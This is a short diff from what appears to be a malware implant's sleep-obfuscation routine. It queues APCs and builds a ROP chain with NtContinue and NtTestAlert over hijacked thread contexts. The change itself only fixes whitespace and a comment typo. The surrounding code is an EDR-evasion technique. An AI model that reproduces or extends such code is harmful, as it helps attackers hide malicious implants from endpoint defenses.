@@ -146,10 +146,10 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     *(uintptr_t*)(rop_set->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
     *(uintptr_t*)(rop_set->Rsp + 0x28) = (uintptr_t) &ContextMemPrt;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_set, nullptr, nullptr));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_set, nullptr, nullptr));
     rop_enc = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
-    // TODO: this is total wrong according to MSDN
+    // TODO: this is totally wrong according to MSDN
     *rop_enc = *stolen;
     rop_enc->ContextFlags = CONTEXT_FULL;
     rop_enc->Rsp          = U_PTR(stolen->Rsp - 0x2000);
